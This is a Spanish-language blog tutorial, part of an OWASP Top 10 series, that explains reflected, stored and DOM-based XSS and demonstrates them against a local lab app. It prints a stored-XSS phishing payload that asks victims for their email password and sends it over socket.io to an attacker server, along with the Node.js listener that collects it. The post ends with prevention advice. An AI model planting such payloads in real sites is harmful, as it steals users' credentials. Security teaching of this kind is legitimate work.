---
layout: post
title:  "Como realizar una inyeccion XSS y obtener credenciales"
description: "Explotando los 10 riesgos mas criticos segun el OWASP VI"
date:   2019-07-15
image:  "img/OwaspTopTen.jpg"
tags:   [Inyeccion XSS, Pentesting WEB, Hacking NodeJS]
---

Hello Engineers!  
En el dia de hoy, vamos a aprender acerca de una debilidad muy usual y critica en las aplicaciones web.  

**A7-Cross-site Scripting**  
XSS es el acrónimo usado para “Cross Site Scripting”.   
Es un tipo de vulnerabilidad de los aplicativos web, el cual puede permitir a un atacante inyectar código JavaScript u otro lenguaje similar sobre dicha página web.  
Las fallas que permiten que estos ataques tengan éxito están bastante extendidas y ocurren en cualquier lugar en que una aplicación web utiliza la entrada de un usuario.   

Los daños de un ataque XSS pueden ser los siguientes:  

  - Robar de sesion.  
  - Redireccionar a sitios de phishing, o a páginas falsas.  
  - Descarga de software malicioso.  
  - Keyloggers.  
  - y otros tipos de ataques del lado cliente.  

## Conceptos Basicos  
Existen tres formas usuales de XSS para atacar a los navegadores de los usuarios:  

**XSS Reflejado**  
Es el más común de los tipos de XSS, sucede cuando una aplicación o API utiliza datos sin validar, suministrados por un usuario y codificados como parte del HTML o Javascript de salida. Un ataque exitoso permite al atacante ejecutar comandos arbitrarios (HTML y Javascript) en el navegador de la víctima.   
Típicamente el usuario deberá interactuar con un enlace, o alguna otra página controlada por el atacante, publicidad maliciosa, entre otros.   

**XSS Almacenado**  
Si el código que hemos insertado se queda almacenado en el servidor, por ejemplo formando parte de una contribución en un foro, el ataque se dice que es persistente o almacenado.    
Un ataque XSS persistente puede tener lugar en el caché de una aplicación web o en una base de datos conectada de dichos sitios web. Los ataques persistentes siempre están en el lado del servidor y tienen un gran riesgo potencial.  

**XSS Basados en DOM:**  
Este tipo de XSS es en el que la carga útil de ataque se ejecuta como resultado de la modificación del DOM "entorno" en el navegador de la víctima.    

## Explotando las vulnerabilidades mas criticas en aplicaciones WEB.  
## XSS Reflejado  
**Escenario de la prueba #1:**   
Vamos aprender a explotar esta vulnerabilidad por medio de un formulario que realiza busqueda sobre registros previamente ingresados.  

Inicialmente vamos a dirigirnos al apartado para realizar la prueba de inyeccion de XSS reflejada.  
**http://172.17.0.2:9090/app/products**  


<figure>
  <img src="{{site.baseurl}}/img/xss.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/xss.png" title="Formulario con un campo de búsqueda">Formulario con un campo de búsqueda</a>.
  </figcaption>
</figure>

El aplicativo web anterior se compone de una tabla de registros y un campo para realizar consultas o busqueda sobre dicha tabla.  
Vamos a realizar una inyeccion de codigo javascript usando este campo.  
La carga util "maliciosa" que usaremos es la siguiente:  

{% highlight html %}
<script>alert("Hacked By Gerh")</script>  
{% endhighlight %}    

A continuacion, doy a mostrar el paso a paso para encontrar un formulario vulnerable a inyecciones XSS.  

<figure>
  <img src="{{site.baseurl}}/img/xss-reflejected.gif" >
	<figcaption>
    <a href="{{site.baseurl}}/img/xss-reflejected.gif" title="Analizando un campo de busqueda vulnerable a XSS">Analizando un campo de busqueda vulnerable a XSS</a>.
  </figcaption>
</figure>

## XSS Almacenado  
**Escenario de la prueba #2:**   
En el escenario anterior aprendimos a realizar una inyeccion XSS reflejada, la cual como se podia apreciar no era persistente debido a que las consultas realizadas no es un dato que se este almacenando en una base de datos.  
El formulario anterior expuesto permite el ingreso de nuevos productos, los cuales son registros que deben estar almacenados en una base de datos.   


<figure>
  <img src="{{site.baseurl}}/img/xss-stored.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/xss-stored.png" title="Analizando posibles registros de la base de datos">Analizando posibles registros de la base de datos</a>.
  </figcaption>
</figure>

En vez de guardar algun registro con palabras normales, vamos a ingresar el siguiente payload.  

{% highlight html %} 
<!-- Importamos la libreria de socket.io -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.2.0/socket.io.dev.js" integrity="sha256-i2Orhi397HWPn93rsCUTW8HBoso65vY/VNTllm9Kuqo=" crossorigin="anonymous"></script> 

<script>
  /* Desplegamos una entrada de texto y solicitamos un dato confidencial para almacenarlo en la variable PassVictim */ 
  var PassVictim = prompt("Por favor ingresa tu contraseña del correo para continuar!", "******");
  alert("Gracias por tu colaboracion")

  /* Le indicamos a socker.io a donde nos vamos a conectar */ 
  var socket = io.connect('http://localhost:8080');
  /* Emitimos un mensaje hacia el servidor concatenando la variable PassVictim, la cual tiene el dato confidencial. */
  socket.emit('message', 'Account Hacked!!  \n' + PassVictim);
</script>  
{% endhighlight %}    

En nuestra maquina atacante, vamos a crear un pequeño servidor con nodejs y codificamos lo siguiente:  
Si desear saber la explicacion a mas detalle con relacion a este desarrollo te invito al siguiente [POST]().  

{% highlight js %}  
var http = require('http');
var fs = require('fs');
var server = http.createServer(function(req, res) {
    fs.readFile('./index.html', 'utf-8', function(error, content) {
        res.writeHead(200, {"Content-Type": "text/html"});
        res.end(content);
    });
});
var io = require('socket.io').listen(server);
io.sockets.on('connection', function (socket) {
    socket.emit('message', 'You are connected!');
    socket.on('message', function (message) {
        console.log(message);
    }); 
});

server.listen(8080);
{% endhighlight %}    

Listo, hemos logrado crear un script para realizar phising aprovechandonos de una inyeccion XSS almacenada.  
A continuacion, vamos a ver el comportamiento de lo previamente construido.  

<figure>
  <img src="{{site.baseurl}}/img/xss-stored.gif" >
	<figcaption>
    <a href="{{site.baseurl}}/img/xss-stored.gif" title="Realizando un phising con una inyeccion XSS almacenada">Realizando un phising con una inyeccion XSS almacenada</a>.
  </figcaption>
</figure>

Incluso si cerramos la sesion y salimos de la aplicacion, Cuando entremos nuevamente se ejecutara el script debido a que esta almacenado en una base de datos.  

## Recomendaciones  
Prevenir XSS requiere mantener los datos no confiables separados del contenido activo del navegador.  
  - Utilizar frameworks seguros que, por diseño, automáticamente codifican el contenido para prevenir XSS, como en Ruby 3.0 o React JS.  
  - Codificar los datos de requerimientos HTTP no confiables en los campos de salida HTML (cuerpo, atributos, JavaScript, CSS, o URL) resuelve los XSS Reflejado y XSS Almacenado.     
  - Habilitar una Política de Seguridad de Contenido (CSP) es una defensa profunda para la mitigación de vulnerabilidades XSS, asumiendo que no hay otras vulnerabilidades que permitan colocar código malicioso vía inclusión de archivos locales, bibliotecas vulnerables en fuentes conocidas almacenadas en Redes de Distribución de Contenidos (CDN) o localmente.  

## Aprende hacking explotando las vulnerabilidades mas criticas en aplicaciones WEB.  

 - [A1: Inyección](https://hackingprofessional.github.io/Security/Como-realizar-una-inyeccion-SQL-OWASP-I)   
 - [A2: Pérdida de Autenticación](https://hackingprofessional.github.io/Security/Perdida-de-autenticacion-y-exposicion-de-datos-OWASP-II)  
 - [A3: Exposición de datos sensibles](https://hackingprofessional.github.io/Security/Perdida-de-autenticacion-y-exposicion-de-datos-OWASP-II)  
 - [A4: Entidades Externas XML (XXE)](https://hackingprofessional.github.io/Security/Como-realizar-una-inyeccion-XML-OWASP-III)  
 - [A5: Pérdida de Control de Acceso](https://hackingprofessional.github.io/Security/Evadiendo-controles-de-acceso-OWASP-IV)  
 - [A6: Configuración de Seguridad Incorrecta](https://hackingprofessional.github.io/Security/El-riesgo-de-las-Configuraciones-Incorrectas-de-Seguridad-OWAPS-V/)  
 - [A7: Secuencia de Comandos en Sitios Cruzados (XSS)](https://hackingprofessional.github.io/Security/Aprende-a-realizar-una-inyeccion-XSS-OWASP-VI)  
 - [A8: Deserialización Insegura](https://hackingprofessional.github.io/Security/Aprende-que-es-Deserializacion-Insegura-OWASP-VII/)  
 - [A9: Componentes con vulnerabilidades conocidas](https://hackingprofessional.github.io/Security/Explotando-vulnerabilidades-conocidas-OWASP-VIII)  
 - [A10: Registro y Monitoreo Insuficientes](https://hackingprofessional.github.io/Security/Explotando-vulnerabilidades-conocidas-OWASP-VIII)  


 [Para mas informacion leer el siguiente PDF publicado por el OWASP](https://www.owasp.org/images/5/5e/OWASP-Top-10-2017-es.pdf)